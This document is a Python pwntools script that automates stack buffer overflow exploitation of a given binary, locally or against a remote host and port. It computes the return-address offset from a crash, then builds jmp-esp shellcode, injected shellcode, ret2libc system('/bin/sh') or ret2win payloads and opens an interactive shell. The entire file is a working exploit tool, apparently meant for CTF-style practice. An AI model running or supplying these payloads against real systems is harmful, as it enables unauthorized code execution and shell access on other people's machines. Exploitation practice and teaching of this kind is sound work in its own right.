#!/usr/bin/python3
from pwn import *
import sys,optparse,ropper

def find_ip(payload, binary_arch):
    p = process(binary)
    context.log_level = "error"
    p.sendline(payload)
    p.wait()
    esp_register = p.corefile.sp
    libc_address = p.corefile.libc.address
    if binary_arch == "32bit":
        ip_offset = cyclic_find(p.corefile.pc)  # x86
    else:
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    return ip_offset,esp_register,libc_address

def find_gadget(binary, gadget):
    try:
        found_gadget = ""
        rs = ropper.RopperService()
        rs.addFile(binary)
        rs.loadGadgetsFor()
        for file, gadget in rs.search(search=gadget):
            found_gadget = gadget.address
    except:
        found_gadget = ""
    return found_gadget

def jmp_exploit(offset, esp_register, binary_arch, jmp_esp):
    try:
        info("offset : %#d ", offset)
        info("esp_register: %#x " ,esp_register)
        info("jmp esp/rsp: %#x", jmp_esp)
        payload = b"\x90"*offset
        if binary_arch == "32bit":
            payload += p32(jmp_esp)
        else:
            payload += p64(jmp_esp)
        payload += b"\x90"* 10
        payload += asm(shellcraft.sh())

        return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")

def injection_exploit(offset, esp_register, binary_arch):
    try:

        info("offset : %#d ", offset)
        info("esp_register: %#x " ,esp_register)
        info("jmp esp/rsp not found")

        payload = b"\x90"*10
        payload += asm(shellcraft.sh())
        payload += b"\x90" *(offset-len(payload)) 
        if binary_arch == "32bit":
            payload += p32(esp_register - offset)  # x86
            info("return_addr: %#x ", (esp_register - offset))
        else:
            payload += p64(esp_register - offset)  # x64

        return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")

def ret2system(offset, binary, binary_arch, libc_address, libc_file):
    try: 
        libc = ELF(libc_file,checksec=False)
        BINSH = next(libc.search(b"/bin/sh")) + libc_address
        SYSTEM = libc.sym["system"] + libc_address
        EXIT = libc.sym["exit"] + libc_address
        info("libc address: %#x", libc_address)
        info("system : %#x ", SYSTEM)
        info("BINSH: %#x " ,BINSH)
        info("EXIT: %#x " ,EXIT)
        if binary_arch == "32bit":
            payload = b"\x90"*offset + p32(SYSTEM) + p32(EXIT) + p32(BINSH)
            return payload
        else:
            POP_RDI = find_gadget(binary,"pop rdi")
            info("POP_RDI: %#x " ,POP_RDI)
            payload = b"\x90"*offset + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
            return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")

def ret2win(offset, binary, binary_arch, win_address):
    try: 
        info("win address: %#x", int(win_address,16))
        if binary_arch == "32bit":
            payload = b"\x90"*offset + p32(int(win_address,16))
            return payload
        else:
            payload = b"\x90"*offset + p64(int(win_address,16))
            return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")
    
    
if __name__ == '__main__':
    try:
        parser = optparse.OptionParser()
        parser.add_option("-b", "--binary", dest="binary", help="Enter targeted binary file")
        parser.add_option("-r", "--remote", dest="remote", help="Remote flag to exploit remotely, example: -r [HOST] [PORT]", nargs=2)
        parser.add_option("-l", "--libc", dest="libc", help="Add libc file to get bypass NX protection")
        parser.add_option("-d", "--debug", dest="debug", help="Debug flag to attach gdb, and pwntools debug mode", action="store_true")
        parser.add_option("-p", "--pattern", dest="pattern", default=500, help="Enter number of pattern offset (Optional)")
        parser.add_option("-a", "--address", dest="address", help="Add address to jmp into")

        (options, arguments) = parser.parse_args()

        # Binary filename
        binary = options.binary

        # Architecture of file
        binary_arch = platform.architecture(executable=binary)[0].strip()
        success("  ------------------------------------------------")
        success("| Developed by Ahmed Alshammari, twitter: @5ch1zo |")
        success("  ------------------------------------------------")
        info("Executable architecture: %#s ",binary_arch)

        # This will automatically get context arch, bits, os etc
        elf = context.binary = ELF(binary, checksec=False)

        # Pass in pattern_size, get back EIP/RIP offset
        pattern = int(options.pattern)
        info("Trying crash the binary with %#d bytes",int(pattern))

        find_ip_list = find_ip(cyclic(pattern), binary_arch)
        offset = find_ip_list[0]
        esp_register = find_ip_list[1]
        libc_address = find_ip_list[2]
        
        # info("libc address: %#x", libc_address)
        context.log_level = "info"
        
        # Finding jmp esp gadget
        jmp_esp = find_gadget(binary,"jmp ?sp")
        
        # Check file's security and filter the result of NX protection
        checksec = ELF(binary,checksec=False).checksec()
        checksec = checksec[checksec.index("NX"):checksec.index("PIE")]


        # Remote Section
        if options.remote:
            host = options.remote[0]
            port = options.remote[1]
            
            p = remote(host,port)

            if options.address:
                payload = ret2win(offset, binary, binary_arch, options.address)

            else:
                if "enabled" in checksec:
                    payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
                
                else:
                    if jmp_esp:
                        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
                    else:
                        error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
            p.sendline(payload)
            p.interactive()
        
        # Local Section
        else:
            # Start program
            io = process(binary)
            


            # Debug Section
            if options.debug:
                context.log_level = 'debug'
                gdb_commands = "init-peda\n"
                gdb_commands += "b main\n"
                if jmp_esp:
                    gdb_commands += "b *"+str(hex(jmp_esp))
                gdb.attach(io, gdb_commands)
            
            if options.address:
                payload = ret2win(offset, binary, binary_arch, options.address)
                
            else:
                if "enabled" in checksec:
                    payload = ret2system(offset, binary, binary_arch, libc_address, options.libc)
                else:
                    # Find esp Section
                    if jmp_esp:
                        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
                    else:
                        payload = injection_exploit(offset, esp_register, binary_arch)
            
            # Send the payload
            io.sendline(payload)
            # Got Shell
            io.interactive()
    except:
        error("you have to debug by your self, add -d or --debug argument")
